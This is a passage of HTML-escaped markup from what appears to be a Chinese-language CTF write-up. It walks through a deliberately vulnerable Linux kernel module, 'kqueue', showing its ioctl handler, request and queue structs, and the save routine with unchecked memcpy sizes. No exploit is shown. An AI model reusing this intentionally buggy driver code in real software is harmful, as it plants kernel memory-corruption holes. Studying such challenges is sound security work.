queue&amp;#x27;s data */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data &amp;amp;&amp;amp; request.data_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        validate(&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(new_queue,&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data,request.data_size));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Internal error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    new_queue += &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Get to the entries of the kqueue */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry *kqueue_entry = (queue_entry *)(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt; + (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;)+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)/&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* copy all possible kqueue entries */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; i=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;request.max_entries+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!kqueue_entry || !kqueue_entry-&amp;gt;data)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(kqueue_entry-&amp;gt;data &amp;amp;&amp;amp; request.data_size)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            validate(&lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;(new_queue,kqueue_entry-&amp;gt;data,request.data_size));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Internal error&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        kqueue_entry = kqueue_entry-&amp;gt;next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        new_queue += &lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;-&amp;gt;data_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Mark the queue as saved */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    isSaved[request.queue_idx] = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; GCC pop_options&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __init &lt;span class=&#34;title function_&#34;&gt;init_kqueue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mutex_init(&amp;amp;operations_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    reg = misc_register(&amp;amp;kqueue_device);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(reg &amp;lt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        mutex_destroy(&amp;amp;operations_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] Failed to register kqueue&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; __exit &lt;span class=&#34;title function_&#34;&gt;exit_kqueue&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    misc_deregister(&amp;amp;kqueue_device);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;module_init(init_kqueue);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;module_exit(exit_kqueue);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;代码比较场我们一点点分析&lt;/p&gt;
&lt;h3 id=&#34;kqueue_ioctl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#kqueue_ioctl&#34;&gt;#&lt;/a&gt; kqueue_ioctl&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; noinline &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;kqueue_ioctl&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; file *file, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; cmd, &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; arg)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt; request;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mutex_lock(&amp;amp;operations_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (copy_from_user((&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)&amp;amp;request, (&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *)arg, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt;)))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        err(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] copy_from_user failed&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;goto&lt;/span&gt; ret;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;switch&lt;/span&gt;(cmd)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; CREATE_KQUEUE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = create_kqueue(request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; DELETE_KQUEUE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = delete_kqueue(request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; EDIT_KQUEUE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = edit_kqueue(request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;case&lt;/span&gt; SAVE:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = save_kqueue_entries(request);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;default&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            result = INVALID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ret: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mutex_unlock(&amp;amp;operations_lock);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;ioctl 函数，用于我们与设备的通信。首先会从用户态拷贝 request 的数据。一些重要结构体的定义如下&lt;/p&gt;
&lt;h3 id=&#34;结构体&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#结构体&#34;&gt;#&lt;/a&gt; 结构体&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; max_entries;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; data_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; entry_idx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; queue_idx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;type&#34;&gt;request_t&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; data_size;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint64_t&lt;/span&gt; queue_size; &lt;span class=&#34;comment&#34;&gt;/* This needs to handle larger numbers */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint32_t&lt;/span&gt; max_entries;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; idx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;span class=&#34;built_in&#34;&gt;queue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;typedef&lt;/span&gt; &lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;queue_entry&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;queue_entry&lt;/span&gt;;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;queue_entry&lt;/span&gt;&amp;#123;&lt;/span&gt;						&lt;span class=&#34;comment&#34;&gt;//队列的节点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;uint16_t&lt;/span&gt; idx;						&lt;span class=&#34;comment&#34;&gt;//节点的位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *data;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    queue_entry *next;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;然后就是根据我们输入的 cmd 进行操作，可以看到是我们熟悉的增删改操作。&lt;/p&gt;
&lt;h3 id=&#34;create_kqueue&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#create_kqueue&#34;&gt;#&lt;/a&gt; create_kqueue&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span 